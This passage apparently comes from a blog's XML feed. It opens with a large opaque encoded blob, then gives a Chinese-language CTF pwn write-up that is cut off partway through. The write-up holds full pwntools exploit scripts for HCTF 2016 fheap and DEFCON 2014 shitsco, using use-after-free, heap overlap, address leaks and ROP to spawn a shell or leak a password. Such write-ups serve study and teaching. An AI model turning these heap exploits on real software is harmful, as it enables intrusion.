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]]></content>
      <tags>
        <tag>linux</tag>
        <tag>pwn</tag>
        <tag>kernel</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Feb pwn writeup]]></title>
    <url>%2F2019%2F02%2F06%2F19-Feb%2F</url>
    <content type="text"><![CDATA[HCTF 2016 fheap [2019.02.05]程序中对在uaf，可以进行double free来造成堆块的重叠。 通过第一次堆块重叠，可以将一个chunk的释放功能的地址改为call puts的地址，从而在delete时调用puts函数进行输出。第二次堆块重叠则用来伪造堆块的大小，使其释放后位于unsorted bin且与前述含有puts函数的堆块重叠。通过分配unsorted bin使得可以通过puts泄漏出libc的基地址。同样的，也可以泄漏出程序的基地址。 但这种方法存在问题：只知道libc基地址而无法知道libc的函数地址。（通过爆破libc版本说不定可以getshell） 不过.got表中存在能够伪造0x70大小chunk的空间，可能可以利用这个和第一次堆块重叠调用puts的方法来把libc泄漏出来。（一个很大的问题就是无法向堆块中写入\x00） 也尝试过调用printf函数来利用格式化字符串漏洞泄漏地址，但是调用时总是会遇到Segmentation Fault。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + '\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'a' * 12 * 0x8 + '\x00') delete(p, 3) gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() 看了官网wp：https://github.com/zh-explorer/hctf2016-fheap/blob/master/poc.py。 它是通过ROP来getshell，在进行delete的时候跳转到gadget强制delete提前返回来达到ROP的目的。利用函数中用于保存用户输入的buf来ROP。 修改后的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') elf = ELF('./pwn-f') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + '\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'b' * 10 * 0x8 + '\x00') # 修改12为10 delete(p, 8) # ------------------------------------------ create(p, 0x300, 'a' * 5 * 0x8 + '\x1a\x00') delete(p, 3) p.recvuntil('a' * 3 * 0x8) elf.address = u64(p.recv(6) + '\x00\x00') - (0x55873e14dd1a - 0x55873e14d000) delete(p, 8) ppppr = elf.address + 0x11dc payload = 'a' * 5 * 0x8 + p64(ppppr) create(p, 0x300, payload) bss_addr = elf.address + 0x202800 rdi_ret = elf.address + 0x11e3 p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(3)) payload = 'yes' + ' ' * 5 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) payload += p64(rdi_ret) + p64(elf.got['free']) + p64(elf.plt['puts']) payload += p64(elf.address + 0xc71) p.sendlineafter('?:', payload) recv = p.recvuntil('\x0a', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['puts'] delete(p, 8) payload = 'a' * 2 * 0x8 + '/bin/sh ' + ' ' * 14 + '&amp;&amp;' + p64(libc.symbols['system']) create(p, 0x300, payload) delete(p, 3) # system('/bin/sh &amp;&amp;' + p64(system_addr)) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() DEFCON QUALIFIER 2014 shitsco [2019.02.09]对于我这种逆向渣来说理顺程序逻辑还是花了一点时间Orz。在对set的值进行清除时，如果清除的是第二个变量且保存在.bss上的第一个变量已经被清除时（此时第二个变量的prev值为0，第一个变量的next值为第二个变量的地址），第一个变量的next不会被修改，导致了UAF。只要将第二个变量所在的chunk重新获取并控制其中的内容为保存密码的地址，就能够泄漏密码获得flag。 12345678910111213141516171819202122232425262728293031from pwn import *def pwn(): context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shitsco') p.sendlineafter('$ ', 'set a 1') p.sendlineafter('$ ', 'set b 1') p.sendlineafter('$ ', 'set c 1') p.sendlineafter('$ ', 'set d ' + '1' * 0x18) p.sendlineafter('$ ', 'set a') p.sendlineafter('$ ', 'set b') p.sendlineafter('$ ', 'set d') payload = 'set c ' + p32(0x804844A) + p32(0x804c3a0) + p32(0x804c260) p.sendlineafter('$ ', payload) p.sendlineafter('$ ', 'show') p.recvuntil('sleep: ') password = p.recvuntil('\n', drop=True) payload = 'enable ' + password p.sendlineafter('$ ', payload) p.sendlineafter('# ', 'flag') gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() PlaidCTF 2015 Plaiddb(datastore) [2019.02.11]在输入索引的函数中，存在着off-by-null。利用off-by-null进行chunk 